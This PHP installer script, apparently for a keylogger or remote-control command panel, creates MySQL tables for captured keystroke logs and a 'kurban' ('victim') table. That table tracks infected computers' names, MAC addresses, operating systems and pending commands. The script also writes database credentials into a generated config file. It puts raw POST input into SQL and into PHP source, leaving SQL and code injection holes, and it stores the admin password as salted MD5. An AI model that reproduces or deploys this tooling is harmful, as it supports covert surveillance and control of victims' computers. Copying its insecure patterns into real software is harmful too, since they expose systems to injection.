<?php
$dosya= "../vt.php";
    
    ob_start();
    
    if (file_exists($dosya))
    {
    header("Location:../index.php");
	exit();
	ob_end_flush();
}

	$sunucuadi=$_POST["sunucuadi"];
	$kullaniciadi=$_POST["kadi"];
	$sifre=$_POST["sifre"];
	$veritabaniadi=$_POST["veritabani"];
	$adminkadi=$_POST["adminkadi"];
	$adminsifre=$_POST["adminsifre"];
	$password=md5('56.o*' . $adminsifre . '?2,3!');
	

$dsn = "mysql:host=".$sunucuadi.";dbname=".$veritabaniadi.";charset=utf8mb4";//veritabanı adını girin
$user = $kullaniciadi;//kullanıcı adını girin
$passwd = $sifre;//şifreyi adını girin

$db = new PDO($dsn, $user, $passwd);

$db-> setAttribute (PDO :: ATTR_ERRMODE, PDO :: ERRMODE_WARNING);

$sorgu = $db->query("

CREATE TABLE `genel` (
  `id` int(11) NOT NULL,
  `url` text COLLATE utf8_turkish_ci NOT NULL,
  `baslat` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;

--
-- Tablo döküm verisi `genel`
--

INSERT INTO `genel` (`id`, `url`, `baslat`) VALUES
(1, 'https://www.google.com', 0);

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `keylog`
--

CREATE TABLE `keylog` (  `id` int(11) NOT NULL,  `macadres` text COLLATE utf8_turkish_ci NOT NULL,  `log` text COLLATE utf8_turkish_ci NOT NULL,  `tarih` datetime NOT NULL DEFAULT current_timestamp()) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;
-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `kullanici`
--

CREATE TABLE `kullanici` (
  `id` int(11) NOT NULL,
  `username` text COLLATE utf8_turkish_ci NOT NULL,
  `password` text COLLATE utf8_turkish_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;

--
-- Tablo döküm verisi `kullanici`
--

INSERT INTO `kullanici` (`id`, `username`, `password`) VALUES
(3, '".$adminkadi."', '".$password."');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `kurban`
--

CREATE TABLE `kurban` (  `id` int(11) NOT NULL,  `bilgisayaradi` text COLLATE utf8_turkish_ci NOT NULL,  `acik` int(11) NOT NULL,  `macadres` text COLLATE utf8_turkish_ci NOT NULL,  `komut` int(11) DEFAULT NULL,  `isletim` text COLLATE utf8_turkish_ci NOT NULL,  `mesag` text COLLATE utf8_turkish_ci DEFAULT NULL,  `hata` int(11) NOT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;

--
-- Dökümü yapılmış tablolar için indeksler
--

--
-- Tablo için indeksler `genel`
--
ALTER TABLE `genel`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `keylog`
--
ALTER TABLE `keylog`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `kullanici`
--
ALTER TABLE `kullanici`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `kurban`
--
ALTER TABLE `kurban`
  ADD PRIMARY KEY (`id`);

--
-- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
--

--
-- Tablo için AUTO_INCREMENT değeri `genel`
--
ALTER TABLE `genel`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- Tablo için AUTO_INCREMENT değeri `keylog`
--
ALTER TABLE `keylog`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- Tablo için AUTO_INCREMENT değeri `kullanici`
--
ALTER TABLE `kullanici`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- Tablo için AUTO_INCREMENT değeri `kurban`
--
ALTER TABLE `kurban`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;


");
if($sorgu){
	
	
	$yaz1='<?php

$dsn = "mysql:host='.$sunucuadi.';dbname='.$veritabaniadi.';charset=utf8mb4";//veritabanı adını girin
$user = "'.$kullaniciadi.'";//kullanıcı adını girin
$passwd = "'.$sifre.'";//şifreyi adını girin

$db = new PDO($dsn, $user, $passwd);

$db-> setAttribute (PDO :: ATTR_ERRMODE, PDO :: ERRMODE_WARNING);


                  

?>';
$dosya = fopen ("metin.txt" , 'w'); //dosya oluşturma işlemi
$yaz=$yaz1;

fwrite ( $dosya , $yaz ) ;
fclose ($dosya);

$sonuc = rename('metin.txt','../vt.php');

header("Location:../index.php");
}else{echo'olmadı';}

?>